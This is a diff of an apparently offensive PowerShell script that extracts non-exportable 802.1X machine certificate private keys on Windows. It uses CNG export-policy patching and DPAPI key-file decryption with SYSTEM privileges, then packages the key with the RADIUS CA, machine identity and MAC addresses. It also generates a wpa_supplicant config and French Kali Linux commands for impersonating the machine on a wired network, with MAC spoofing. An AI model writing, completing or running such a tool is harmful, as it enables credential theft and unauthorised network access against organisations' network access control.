-            Write-Host "[-] Method 3 failed: no RSA key blob magic found in decrypted data." -ForegroundColor DarkYellow
-            return $false
-        }
-
-        Write-Host "[*] $rsaMagicType blob at offset $rsaMagicOffset in decrypted data." -ForegroundColor Gray
-
-        $certDer = $Cert.RawData
-
-        if ($rsaMagicType -eq "RSA3") {
-            # Standard BCRYPT_RSAFULLPRIVATE_BLOB - pass directly to PfxBuilder
-            $rsaBlobLen = $decryptedBlob.Length - $rsaMagicOffset
-            $rsaBlob = New-Object byte[] $rsaBlobLen
-            [Array]::Copy($decryptedBlob, $rsaMagicOffset, $rsaBlob, 0, $rsaBlobLen)
-            $pfxBytes = [PfxBuilder]::BuildPfxFromBcryptBlob($rsaBlob, $certDer, $Password)
-        }
-        else {
-            # RSA2 - CAPI key file format with 20-byte header and padding between components
-            # Header: magic(4) + field1(4) + bitLength(4) + field3(4) + pubexp(4)
-            # Then: Modulus + 8-byte pad + P + 4-byte pad + Q + 4-byte pad +
-            #       DP + 4-byte pad + DQ + 4-byte pad + InverseQ + 4-byte pad + D
-            # All in little-endian (CAPI format)
-            $hdrBase = $rsaMagicOffset
-            $bitLen = [BitConverter]::ToUInt32($decryptedBlob, $hdrBase + 8)
-            $pubExp = [BitConverter]::ToUInt32($decryptedBlob, $hdrBase + 16)
-
-            if ($bitLen -lt 512 -or $bitLen -gt 16384) {
-                Write-Host "[-] Unexpected bit length: $bitLen" -ForegroundColor DarkYellow
-                return $false
-            }
-
-            $modulusLen = [int]($bitLen / 8)
-            $halfLen = [int]($bitLen / 16)
-            Write-Host "[*] RSA key: $bitLen bits, modulus=$modulusLen bytes" -ForegroundColor Gray
-
-            # Extract components at the padded offsets
-            $off = $hdrBase + 20
-            $modBytes = New-Object byte[] $modulusLen; [Array]::Copy($decryptedBlob, $off, $modBytes, 0, $modulusLen)
-            $off += $modulusLen + 8  # 8-byte padding after modulus
-            $pBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $pBytes, 0, $halfLen)
-            $off += $halfLen + 4     # 4-byte padding after each half-length component
-            $qBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $qBytes, 0, $halfLen)
-            $off += $halfLen + 4
-            $dpBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $dpBytes, 0, $halfLen)
-            $off += $halfLen + 4
-            $dqBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $dqBytes, 0, $halfLen)
-            $off += $halfLen + 4
-            $iqBytes = New-Object byte[] $halfLen; [Array]::Copy($decryptedBlob, $off, $iqBytes, 0, $halfLen)
-            $off += $halfLen + 4
-            $dBytes = New-Object byte[] $modulusLen; [Array]::Copy($decryptedBlob, $off, $dBytes, 0, $modulusLen)
-
-            # Build a standard CAPI PRIVATEKEYBLOB (BLOBHEADER + RSAPUBKEY + key data, no padding)
-            $keyDataLen = $modulusLen + $halfLen * 5 + $modulusLen
-            [byte[]]$cspBlob = New-Object byte[] (20 + $keyDataLen)
-            # BLOBHEADER: type=PRIVATEKEYBLOB(0x07) version=0x02 reserved=0 algid=CALG_RSA_KEYX(0xA400)
-            $cspBlob[0] = 0x07; $cspBlob[1] = 0x02; $cspBlob[5] = 0xA4
-            # RSAPUBKEY: magic=RSA2 bitlen pubexp
-            $cspBlob[8] = 0x52; $cspBlob[9] = 0x53; $cspBlob[10] = 0x41; $cspBlob[11] = 0x32
-            [Array]::Copy([BitConverter]::GetBytes([uint32]$bitLen), 0, $cspBlob, 12, 4)
-            [Array]::Copy([BitConverter]::GetBytes([uint32]$pubExp), 0, $cspBlob, 16, 4)
-            # Key data (contiguous, little-endian)
-            $cOff = 20
-            [System.Buffer]::BlockCopy($modBytes, 0, $cspBlob, $cOff, $modulusLen); $cOff += $modulusLen
-            [System.Buffer]::BlockCopy($pBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
-            [System.Buffer]::BlockCopy($qBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
-            [System.Buffer]::BlockCopy($dpBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
-            [System.Buffer]::BlockCopy($dqBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
-            [System.Buffer]::BlockCopy($iqBytes, 0, $cspBlob, $cOff, $halfLen); $cOff += $halfLen
-            [System.Buffer]::BlockCopy($dBytes, 0, $cspBlob, $cOff, $modulusLen)
-
-            $pfxBytes = [PfxBuilder]::BuildPfxFromCspBlob($cspBlob, $certDer, $Password)
-        }
-
-        [System.IO.File]::WriteAllBytes($OutputPath, $pfxBytes)
-
-        # Verify
-        $verify = New-Object System.Security.Cryptography.X509Certificates.X509Certificate2(
-            $OutputPath, $Password,
-            [System.Security.Cryptography.X509Certificates.X509KeyStorageFlags]::Exportable
-        )
-        if ($verify.HasPrivateKey) {
-            $verify.Dispose()
-            Write-Host "[+] Method 3 SUCCESS - DPAPI file decrypt + PFX build worked." -ForegroundColor Green
-            return $true
-        }
-        $verify.Dispose()
-        Remove-Item -Path $OutputPath -Force -ErrorAction SilentlyContinue
-        return $false
-    }
-    catch {
-        Write-Host "[-] Method 3 failed: $($_.Exception.Message)" -ForegroundColor DarkYellow
-        return $false
-    }
-}
-
-function Show-Summary {
-    param(
-        [PSCustomObject]$CertInfo,
-        [string]$OutputPath,
-        [string]$MethodUsed
-    )
-
-    Write-Host ""
-    Write-Host "=============================================" -ForegroundColor Green
-    Write-Host "  EXPORT SUCCESSFUL" -ForegroundColor Green
-    Write-Host "=============================================" -ForegroundColor Green
-    Write-Host ""
-    Write-Host "  Subject:     $($CertInfo.Subject)" -ForegroundColor White
-    Write-Host "  Issuer:      $($CertInfo.Issuer)" -ForegroundColor White
-    Write-Host "  Thumbprint:  $($CertInfo.Thumbprint)" -ForegroundColor White
-    Write-Host "  Template:    $($CertInfo.Template)" -ForegroundColor White
-    Write-Host "  EKU:         $($CertInfo.EKU)" -ForegroundColor White
-    Write-Host "  Expires:     $($CertInfo.NotAfter)" -ForegroundColor White
-    Write-Host "  Method:      $MethodUsed" -ForegroundColor White
-    Write-Host "  PFX Path:    $OutputPath" -ForegroundColor Cyan
-    Write-Host "  PFX Size:    $((Get-Item $OutputPath).Length) bytes" -ForegroundColor White
-    Write-Host ""
-    Write-Host "  Use: certutil -dump `"$OutputPath`"" -ForegroundColor DarkGray
-    Write-Host "  Or import with the configured password." -ForegroundColor DarkGray
-    Write-Host ""
-}
-
-# ========================
-# MAIN EXECUTION
-# ========================
-
-Write-Banner
-
-# Check elevation
-$elevation = Test-IsElevated
-if (-not $elevation.IsAdmin -and -not $elevation.IsSystem) {
-    Write-Host "[-] ERROR: This script requires Administrator or SYSTEM privileges." -ForegroundColor Red
-    Write-Host "[-] Current user: $($elevation.UserName)" -ForegroundColor Red
-    Write-Host "[-] Run from an elevated prompt or as SYSTEM (e.g., PsExec -s)." -ForegroundColor Red
-    exit 1
-}
-
-$contextLabel = if ($elevation.IsSystem) { "SYSTEM" } elseif ($elevation.IsAdmin) { "Administrator" }
-Write-Host "[+] Running as: $($elevation.UserName) ($contextLabel)" -ForegroundColor Green
-
-# Resolve output directory
 $OutputDir = (Resolve-Path $OutputDir -ErrorAction SilentlyContinue).Path
-if (-not $OutputDir) {
-    $OutputDir = (Get-Location).Path
-}
+if (-not $OutputDir) { $OutputDir = (Get-Location).Path }
 
-# Find certificates
 $allCerts = Find-8021xCerts
-if (-not $allCerts) {
-    Write-Host "[-] No certificates found. Exiting." -ForegroundColor Red
-    exit 1
-}
+if (-not $allCerts) { exit 1 }
 
-# Select target certificate
-$targetCert = $null
+# Select certificate
+$target = $null
 if ($Thumbprint) {
-    $targetCert = $allCerts | Where-Object { $_.Thumbprint -eq $Thumbprint }
-    if (-not $targetCert) {
-        Write-Host "[-] Certificate with thumbprint $Thumbprint not found." -ForegroundColor Red
-        exit 1
+    $target = $allCerts | Where-Object { $_.Thumbprint -eq $Thumbprint }
+    if (-not $target) { Write-Host "[-] Thumbprint not found." -ForegroundColor Red; exit 1 }
+} else {
+    [array]$cand = @($allCerts | Where-Object { $_.Is8021x -and $_.HasPrivateKey })
+    if ($cand.Count -eq 0) { [array]$cand = @($allCerts | Where-Object { $_.HasPrivateKey }) }
+    if ($cand.Count -eq 0) { Write-Host "[-] No certs with private keys." -ForegroundColor Red; exit 1 }
+    if ($cand.Count -eq 1) { $target = $cand[0] }
+    else {
+        Write-Host "[*] Multiple candidates:" -ForegroundColor Yellow
+        for ($i = 0; $i -lt $cand.Count; $i++) {
+            $m = if ($cand[$i].Is8021x) { "[802.1X]" } else { "[Other]" }
+            Write-Host "  [$i] $m $($cand[$i].Subject) | $($cand[$i].Thumbprint.Substring(0,8))..." -ForegroundColor White
+        }
+        $sel = Read-Host "Select [0-$($cand.Count-1)]"
+        $target = $cand[[int]$sel]
     }
-    Write-Host "[+] Targeted certificate by thumbprint: $($targetCert.Subject)" -ForegroundColor Green
-}
-else {
-    $targetCert = Select-Certificate -CertList $allCerts
-}
-
-if (-not $targetCert) {
-    Write-Host "[-] No certificate selected. Exiting." -ForegroundColor Red
-    exit 1
 }
 
 Write-Host ""
-Write-Host "[*] Target: $($targetCert.Subject)" -ForegroundColor Cyan
-Write-Host "[*] Thumbprint: $($targetCert.Thumbprint)" -ForegroundColor Cyan
+Write-Host "[*] Target: $($target.Subject)" -ForegroundColor Cyan
+Write-Host "[*] Template: $($target.Template)" -ForegroundColor Cyan
+Write-Host "[*] Thumbprint: $($target.Thumbprint)" -ForegroundColor Cyan
+Write-Host ""
 
-# Build output path
-$safeName = $targetCert.Thumbprint.Substring(0, 8)
-$outputPath = Join-Path $OutputDir "$($env:COMPUTERNAME)_$safeName.pfx"
+$kaliDir = Join-Path $OutputDir "8021x_kali"
+if (-not (Test-Path $kaliDir)) { New-Item -ItemType Directory -Path $kaliDir -Force | Out-Null }
 
-# Try methods in order
-$success = $false
-$methodUsed = ""
+$pfxFile = "$($env:COMPUTERNAME)_$($target.Thumbprint.Substring(0,8)).pfx"
+$outPath = Join-Path $kaliDir $pfxFile
+$log = ""
+$pfx = [CngExtractor]::ExtractPfx($target.Cert, $PfxPassword, [ref]$log)
 
-# Method 1: Direct export
-$success = Export-Method1-DirectExport -Cert $targetCert.Cert -OutputPath $outputPath -Password $PfxPassword
-if ($success) { $methodUsed = "Method 1 - Direct .NET export" }
+$log.Split("`n") | ForEach-Object { $l = $_.TrimEnd(); if ($l) {
+    $col = "Gray"
+    if ($l.StartsWith("[+]")) { $col = "Green" }
+    elseif ($l.StartsWith("[-]")) { $col = "Red" }
+    elseif ($l.StartsWith("[!]")) { $col = "Magenta" }
+    Write-Host $l -ForegroundColor $col
+}}
 
-# Method 2: CNG export policy patch
-if (-not $success) {
-    $success = Export-Method2-PatchCNG -Cert $targetCert.Cert -OutputPath $outputPath -Password $PfxPassword
-    if ($success) { $methodUsed = "Method 2 - CNG NCryptSetProperty patch" }
-}
-
-# Method 3: Raw key file + DPAPI
-if (-not $success) {
-    $success = Export-Method3-DPAPIKeyFile -Cert $targetCert.Cert -OutputPath $outputPath -Password $PfxPassword
-    if ($success) { $methodUsed = "Method 3 - DPAPI LocalMachine key file decrypt" }
-}
-
-if ($success) {
-    Show-Summary -CertInfo $targetCert -OutputPath $outputPath -MethodUsed $methodUsed
-}
-else {
+if (-not $pfx -or $pfx.Length -eq 0) {
     Write-Host ""
     Write-Host "=============================================" -ForegroundColor Red
     Write-Host "  ALL METHODS FAILED" -ForegroundColor Red
     Write-Host "=============================================" -ForegroundColor Red
-    Write-Host ""
-    Write-Host "  Possible causes:" -ForegroundColor Yellow
-    Write-Host "  - Key is TPM-bound (hardware-protected, non-extractable)" -ForegroundColor Gray
-    Write-Host "  - Key uses a third-party KSP with custom protection" -ForegroundColor Gray
-    Write-Host "  - Insufficient privileges (need SYSTEM for DPAPI machine keys)" -ForegroundColor Gray
-    Write-Host "  - Key file format not recognized" -ForegroundColor Gray
-    Write-Host ""
-    Write-Host "  Suggestions:" -ForegroundColor Yellow
-    Write-Host "  - Run as SYSTEM: PsExec -s -i powershell" -ForegroundColor Gray
-    Write-Host "  - Check if key is TPM-bound: certutil -store My <thumbprint>" -ForegroundColor Gray
-    Write-Host "  - Try: certutil -exportPFX My <thumbprint> output.pfx" -ForegroundColor Gray
-    Write-Host ""
     exit 1
 }
+
+[System.IO.File]::WriteAllBytes($outPath, $pfx)
+Write-Host ""
+Write-Host "=============================================" -ForegroundColor Green
+Write-Host "  EXPORT SUCCESSFUL" -ForegroundColor Green
+Write-Host "=============================================" -ForegroundColor Green
+Write-Host "  PFX:        $outPath" -ForegroundColor Cyan
+Write-Host "  Size:       $($pfx.Length) bytes" -ForegroundColor White
+Write-Host "  Password:   $PfxPassword" -ForegroundColor White
+Write-Host "  Subject:    $($target.Subject)" -ForegroundColor White
+Write-Host "  Thumbprint: $($target.Thumbprint)" -ForegroundColor White
+Write-Host ""
+
+# =============================================
+#  PHASE 2: Detect RADIUS server CA
+# =============================================
+Write-Host "=============================================" -ForegroundColor Cyan
+Write-Host "  Detecting RADIUS server CA..." -ForegroundColor Cyan
+Write-Host "=============================================" -ForegroundColor Cyan
+
+$radiusCaPem = ""
+$radiusCaSubject = ""
+
+# Method A: Parse wired 802.1X profile XML for TrustedRootCA thumbprints
+$profileDir = Join-Path $OutputDir "wlan_profiles_tmp"
+$foundFromProfile = $false
+try {
+    if (-not (Test-Path $profileDir)) { New-Item -ItemType Directory -Path $profileDir -Force | Out-Null }
+    $exp = netsh lan export profile folder="$profileDir" 2>&1
+    $xmlFiles = Get-ChildItem $profileDir -Filter "*.xml" -ErrorAction SilentlyContinue
+    foreach ($xf in $xmlFiles) {
+        [xml]$profileXml = Get-Content $xf.FullName -Encoding UTF8
+        $ns = New-Object Xml.XmlNamespaceManager($profileXml.NameTable)
+        $ns.AddNamespace("t","http://www.microsoft.com/provisioning/EapTlsConnectionPropertiesV1")
+        $trustedCAs = $profileXml.SelectNodes("//t:TrustedRootCA", $ns)
+        if (-not $trustedCAs -or $trustedCAs.Count -eq 0) {
+            $trustedCAs = $profileXml.SelectNodes("//TrustedRootCA")
+        }
+        if ($trustedCAs -and $trustedCAs.Count -gt 0) {
+            Write-Host "[+] Found TrustedRootCA in wired profile:" -ForegroundColor Green
+            foreach ($tca in $trustedCAs) {
+                $tp = $tca.InnerText.Trim() -replace " ","" -replace "-",""
+                $tpUp = $tp.ToUpper()
+                Write-Host "    Thumbprint: $tp" -ForegroundColor White
+                $caCert = Get-ChildItem Cert:\LocalMachine\Root | Where-Object { $_.Thumbprint.ToUpper() -eq $tpUp }
+                if (-not $caCert) { $caCert = Get-ChildItem Cert:\LocalMachine\CA | Where-Object { $_.Thumbprint.ToUpper() -eq $tpUp } }
+                if (-not $caCert) { $caCert = Get-ChildItem Cert:\LocalMachine\AuthRoot | Where-Object { $_.Thumbprint.ToUpper() -eq $tpUp } }
+                if ($caCert) {
+                    Write-Host "    Subject: $($caCert.Subject)" -ForegroundColor White
+                    $radiusCaPem += "-----BEGIN CERTIFICATE-----`n"
+                    $radiusCaPem += [Convert]::ToBase64String($caCert.RawData, 'InsertLineBreaks')
+                    $radiusCaPem += "`n-----END CERTIFICATE-----`n"
+                    $radiusCaSubject = $caCert.Subject
+                    $foundFromProfile = $true
+                } else {
+                    Write-Host "    [-] Cert NOT in store (thumbprint not found)" -ForegroundColor Yellow
+                }
+            }
+        }
+    }
+    Remove-Item $profileDir -Recurse -Force -ErrorAction SilentlyContinue
+} catch {
+    Write-Host "[-] Profile parse error: $_" -ForegroundColor Yellow
+    Remove-Item $profileDir -Recurse -Force -ErrorAction SilentlyContinue
+}
+
+# Method B: Fallback - find AD CS root CA matching this machine's domain
+if (-not $foundFromProfile) {
+    Write-Host "[*] Profile CA not found, scanning root store..." -ForegroundColor Yellow
+    $domainParts = ((Get-WmiObject Win32_ComputerSystem).Domain -split "\.")
+    $adCsCAs = @()
+    foreach ($rootCert in (Get-ChildItem Cert:\LocalMachine\Root)) {
+        $subj = $rootCert.Subject
+        $matchDomain = $false
+        foreach ($dp in $domainParts) {
+            if ($dp.Length -ge 3 -and $subj -match [regex]::Escape($dp)) { $matchDomain = $true; break }
+        }
+        if ($matchDomain -and $subj -match "DC=") { $adCsCAs += $rootCert }
+    }
+    if ($adCsCAs.Count -eq 0) {
+        $adCsCAs = Get-ChildItem Cert:\LocalMachine\Root | Where-Object { $_.Subject -match "DC=" -and $_.Issuer -eq $_.Subject }
+    }
+    if ($adCsCAs) {
+        foreach ($ca in $adCsCAs) {
+            Write-Host "[+] AD CS root CA: $($ca.Subject)" -ForegroundColor Green
+            $radiusCaPem += "-----BEGIN CERTIFICATE-----`n"
+            $radiusCaPem += [Convert]::ToBase64String($ca.RawData, 'InsertLineBreaks')
+            $radiusCaPem += "`n-----END CERTIFICATE-----`n"
+            $radiusCaSubject = $ca.Subject
+            $foundFromProfile = $true
+        }
+    }
+}
+
+# Method C: Last resort - all root CAs
+if (-not $foundFromProfile) {
+    Write-Host "[-] No AD CS CA found, exporting ALL root CAs as fallback..." -ForegroundColor Yellow
+    Get-ChildItem Cert:\LocalMachine\Root | ForEach-Object {
+        $radiusCaPem += "-----BEGIN CERTIFICATE-----`n"
+        $radiusCaPem += [Convert]::ToBase64String($_.RawData, 'InsertLineBreaks')
+        $radiusCaPem += "`n-----END CERTIFICATE-----`n"
+    }
+}
+
+$caPemPath = Join-Path $kaliDir "ca-radius.pem"
+[IO.File]::WriteAllText($caPemPath, $radiusCaPem)
+Write-Host "[+] RADIUS CA:  $caPemPath" -ForegroundColor Green
+
+# =============================================
+#  PHASE 3: Detect identity & MACs
+# =============================================
+Write-Host ""
+Write-Host "=============================================" -ForegroundColor Cyan
+Write-Host "  Detecting 802.1X identity..." -ForegroundColor Cyan
+Write-Host "=============================================" -ForegroundColor Cyan
+
+$fqdn = "$($env:COMPUTERNAME).$((Get-WmiObject Win32_ComputerSystem).Domain)".ToLower()
+$identity = "host/$fqdn"
+Write-Host "[+] Machine identity: $identity" -ForegroundColor Green
+
+$macs = @()
+Get-NetAdapter -ErrorAction SilentlyContinue | Where-Object {
+    $_.MacAddress -and $_.MacAddress -ne "00-00-00-00-00-00"
+} | ForEach-Object {
+    $type = "Other"
+    if ($_.InterfaceDescription -match "Wi-?Fi|Wireless|WLAN|802\.11") { $type = "WiFi" }
+    elseif ($_.InterfaceDescription -match "USB|ASIX|AX88|RTL8153|RTL8152|Belkin|TP-?Link|Plugable|Anker|StarTech|UE[0-9]|LAN[0-9]") { $type = "USB" }
+    elseif ($_.InterfaceDescription -match "Ethernet|Realtek|Intel.*I[0-9]|Broadcom.*NetXtreme|Killer.*E|Marvell") { $type = "Ethernet" }
+    elseif ($_.InterfaceDescription -match "Bluetooth") { $type = "Bluetooth" }
+    elseif ($_.InterfaceDescription -match "VPN|Virtual|Hyper-V|vEthernet|TAP-|WireGuard|Fortinet|Cisco AnyConnect") { $type = "Virtual" }
+    $macs += [PSCustomObject]@{
+        Name = $_.Name
+        MAC = $_.MacAddress.Replace("-",":").ToLower()
+        Status = $_.Status
+        Desc = $_.InterfaceDescription
+        Type = $type
+    }
+}
+Write-Host "[+] $($macs.Count) interface(s) found:" -ForegroundColor Green
+foreach ($m in $macs) {
+    $col = if ($m.Status -eq "Up") { "Green" } else { "Gray" }
+    $st = if ($m.Status -eq "Up") { "UP" } else { "down" }
+    Write-Host "    [$($m.Type.PadRight(9))] $($m.MAC)  ($st)  $($m.Desc)" -ForegroundColor $col
+}
+
+# =============================================
+#  PHASE 4: Generate config and commands
+# =============================================
+
+# Generate wpa_supplicant config
+$wpaConf = @"
+ctrl_interface=/var/run/wpa_supplicant
+ap_scan=0
+network={
+    key_mgmt=IEEE8021X
+    eapol_flags=0
+    eap=TLS
+    identity="$identity"
+    client_cert="cert.pem"
+    private_key="key.pem"
+    ca_cert="ca-radius.pem"
+}
+"@
+[IO.File]::WriteAllText((Join-Path $kaliDir "wpa_8021x.conf"), $wpaConf)
+
+# Generate commands.txt
+$macLines = ""
+if ($macs.Count -gt 0) {
+    $macLines += "# Toutes les MACs de la machine $($env:COMPUTERNAME):`n"
+    $macLines += "# Teste chaque MAC jusqu'a trouver celle acceptee par le switch/RADIUS`n"
+    $macLines += "#`n"
+    foreach ($m in $macs) {
+        $st = if ($m.Status -eq "Up") { "ACTIVE" } else { "down" }
+        $macLines += "#   [$($m.Type)]  $($m.MAC)  ($st)  $($m.Desc)`n"
+    }
+    $macLines += "#`n"
+    $i = 0
+    foreach ($m in $macs) {
+        if ($m.Type -eq "Virtual") { continue }
+        $prefix = if ($i -eq 0) { "" } else { "# " }
+        $macLines += "`n${prefix}sudo ip link set eth0 down"
+        $macLines += "`n${prefix}sudo ip link set eth0 address $($m.MAC)"
+        $macLines += "`n${prefix}sudo ip link set eth0 up"
+        $macLines += "  # $($m.Type) - $($m.Desc)`n"
+        $i++
+    }
+}
+
+$commands = @"
+====================================================
+  802.1X EAP-TLS - Commandes Kali Linux
+  Machine: $fqdn
+  Identity: $identity
+====================================================
+
+Fichiers dans ce dossier:
+  - $pfxFile   (cert + cle privee, password: $PfxPassword)
+  - ca-radius.pem            (CA du serveur RADIUS)
+  - wpa_8021x.conf           (config wpa_supplicant prete)
+
+====================================================
+  ETAPE 1: Extraire cert et cle depuis le PFX
+====================================================
+
+openssl pkcs12 -in $pfxFile -clcerts -nokeys -out cert.pem -passin pass:$PfxPassword
+openssl pkcs12 -in $pfxFile -nocerts -nodes -out key.pem -passin pass:$PfxPassword
+
+====================================================
+  ETAPE 2: Connexion 802.1X
+====================================================
+
+# Lancer wpa_supplicant (remplacer eth0 par ton interface)
+sudo wpa_supplicant -i eth0 -c wpa_8021x.conf -D wired -d
+
+# Dans un autre terminal, obtenir une IP
+sudo dhclient eth0
+
+====================================================
+  (OPTIONNEL) Spoof MAC
+====================================================
+
+$macLines
+
+====================================================
+  NOTES
+====================================================
+
+- ca-radius.pem = CA qui a signe le cert du SERVEUR RADIUS
+  (PAS la CA du cert client, ce sont 2 PKI differentes !)
+
+- ap_scan=0 et eapol_flags=0 sont obligatoires pour le filaire
+
+- L'identity DOIT etre au format host/FQDN
+
+- Le spoof MAC n'est PAS obligatoire (ClearPass ne filtre pas par MAC)
+"@
+[IO.File]::WriteAllText((Join-Path $kaliDir "commands.txt"), $commands)
+
+Write-Host ""
+Write-Host "=============================================" -ForegroundColor Green
+Write-Host "  KALI OUTPUT FOLDER" -ForegroundColor Green
+Write-Host "=============================================" -ForegroundColor Green
+Get-ChildItem $kaliDir | ForEach-Object {
+    Write-Host "  $($_.Name)  ($($_.Length) bytes)" -ForegroundColor White
+}
+Write-Host ""
+Write-Host "  -> $kaliDir" -ForegroundColor Cyan
+Write-Host ""
+Write-Host "  Copie ce dossier sur ta Kali et suis commands.txt" -ForegroundColor Yellow
+Write-Host ""
